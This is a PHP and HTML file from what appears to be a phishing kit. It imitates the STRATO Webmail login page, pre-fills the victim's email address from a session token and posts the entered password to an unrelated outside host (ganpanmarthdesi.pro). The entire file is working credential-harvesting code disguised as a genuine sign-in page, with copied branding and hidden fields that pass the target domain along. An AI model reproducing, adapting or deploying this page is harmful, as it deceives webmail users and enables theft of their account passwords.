<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>
<title>Login - STRATO Webmail</title>
<link id="favicon" rel="shortcut icon" href="https://webmail.strato.de/appsuite/v=7.10.5-28.20220120.153528/apps/themes/default/favicon.ico" type="image/x-icon">
<head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
input[type=text] {
  width: 100%;
  height: 43px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/kD2gDrn/id.png");
  background-position: 1px 5px; 
  background-repeat: no-repeat;
  padding: 10px 30px;
}
input[type=password] {
  width: 100%;
  height: 43;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 15px;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-image: url("https://i.ibb.co/gV0dDpt/pw.png");
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 30px;
}
</style>
</head>
<body background="https://i.ibb.co/XkLdjGC/bg.png">


<div align="center">
	<table border="0" width="1089" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="67" >
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td height="10"></td>
						</tr>
						<tr>
							<td>
							<img border="0" src="https://i.ibb.co/0Y26JyP/header.png" width="1089" height="47"></td>
						</tr>
						<tr>
							<td height="10"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="529" >
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="231"></td>
							<td height="526" background="https://i.ibb.co/MDRLGhV/fm.png">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							   <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
								<tr>
									<td height="184"></td>
								</tr>
								<tr>
									<td height="43">
									<table height="43" border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="138"></td>
											<td>
											   <input type="text" name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
											   <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
											   <input type="hidden" name="link" value="https://webmail.strato.de/appsuite/signin" >
											   <input type="hidden" name="sender" value="Strato.de" >
											</td>
											<td width="147"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="35"></td>
								</tr>
								<tr>
									<td height="43">
									<table height="43" border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="138"></td>
											<td>
											   <input type="password" name="passwd" required autofocus >
											 </td>
											<td width="147"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="136"></td>
								</tr>
								<tr>
									<td>
									<table height="43" border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="137">&nbsp;</td>
											<td>
											<input type="image" src="https://i.ibb.co/3mW3gSQ/btn.png" width="360" height="40"></td>
											<td width="130">&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="43"></td>
								</tr>
								</form>
							</table>
							</td>
							<td width="231"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="67" >
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td height="23"></td>
						</tr>
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td width="5"></td>
									<td>
									<img border="0" src="https://i.ibb.co/BqY4x2j/footer.png" width="1081" height="24"></td>
									<td width="5"></td>
								</tr>
							</table>
							</td>
						</tr>
						<tr>
							<td height="22"></td>
						</tr>
					</table>
					</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>
</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>